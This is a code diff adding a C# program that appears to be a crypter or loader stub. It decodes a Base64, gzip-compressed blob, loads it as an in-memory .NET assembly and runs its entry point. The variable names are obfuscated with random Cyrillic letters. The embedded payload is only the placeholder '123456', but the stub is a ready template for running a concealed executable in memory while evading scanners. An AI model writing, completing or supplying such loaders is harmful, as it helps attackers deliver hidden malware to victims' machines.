@@ -1,0 +1,61 @@
+﻿using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Data;
+using System.Drawing;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Linq;
+using System.Xml.Linq;
+using System.Threading.Tasks;
+using System.IO;
+using System.IO.Compression;
+
+namespace v
+{
+    internal static class Module1
+    {
+        public static byte[] crypt()
+        {
+            return Decompress(Convert.FromBase64String("123456"));
+
+
+        }
+        public static byte[] Decompress(byte[] bytData)
+        {
+            using (MemoryStream oMS = new MemoryStream(bytData))
+            {
+                using (GZipStream oGZipStream = new GZipStream(oMS, CompressionMode.Decompress))
+                {
+                    const int CHUNK = 1024;
+                    int intTotalBytesRead = 0;
+                    do
+                    {
+                        Array.Resize(ref bytData, intTotalBytesRead + CHUNK);
+                        int intBytesRead = oGZipStream.Read(bytData, intTotalBytesRead, CHUNK);
+                        intTotalBytesRead += intBytesRead;
+                        if (intBytesRead < CHUNK)
+                        {
+                            Array.Resize(ref bytData, intTotalBytesRead);
+                            break;
+                        }
+                    } while (true);
+                    oGZipStream.Close();
+                }
+                oMS.Close();
+            }
+            return bytData;
+        }
+        static void Main()
+        {
+            System.Reflection.Assembly ѢоДгяёБзБхѫЛпПшёжоЦъЦдХилоЖЮИюнъпЩЖ = null;
+            System.Reflection.MethodInfo чЙЮжЙЖЪДЮЧъинЛШѪПѪгФЗбщдюёьЬЮД = null;
+            object ѪЗЖщьъбЦкБжЙЦлждъДШзГѫиЖФ = null;
+            ѢоДгяёБзБхѫЛпПшёжоЦъЦдХилоЖЮИюнъпЩЖ = System.Reflection.Assembly.Load(Module1.crypt());
+            чЙЮжЙЖЪДЮЧъинЛШѪПѪгФЗбщдюёьЬЮД = ѢоДгяёБзБхѫЛпПшёжоЦъЦдХилоЖЮИюнъпЩЖ.EntryPoint;
+            ѪЗЖщьъбЦкБжЙЦлждъДШзГѫиЖФ = ѢоДгяёБзБхѫЛпПшёжоЦъЦдХилоЖЮИюнъпЩЖ.CreateInstance(чЙЮжЙЖЪДЮЧъинЛШѪПѪгФЗбщдюёьЬЮД.Name);
+            чЙЮжЙЖЪДЮЧъинЛШѪПѪгФЗбщдюёьЬЮД.Invoke(ѪЗЖщьъбЦкБжЙЦлждъДШзГѫиЖФ, null);
+        }
+    }
+
+}
